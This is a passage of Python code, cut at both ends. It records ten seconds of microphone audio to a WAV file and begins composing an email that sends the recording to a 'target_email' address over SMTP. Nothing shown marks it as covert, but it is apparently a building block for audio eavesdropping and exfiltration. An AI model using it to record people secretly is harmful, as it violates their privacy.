    :param email_pass: The email password for authentication.
    :param target_email: The email address to send the recorded audio to.
    """
    
    def record_audio(output_file):
        chunk = 1024
        sample_format = pyaudio.paInt16
        channels = 2
        fs = 44100
        seconds = 10
        
        p = pyaudio.PyAudio()
        
        stream = p.open(format=sample_format,
                        channels=channels,
                        rate=fs,
                        frames_per_buffer=chunk,
                        input=True)
        
        frames = []
        
        for i in range(0, int(fs / chunk * seconds)):
            data = stream.read(chunk)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        wf = wave.open(output_file, 'wb')
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(sample_format))
        wf.setframerate(fs)
        wf.writeframes(b''.join(frames))
        wf.close()
    
    def send_email(output_file, smtp_server, smtp_port, email_user, email_pass, target_email):
        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = target_email
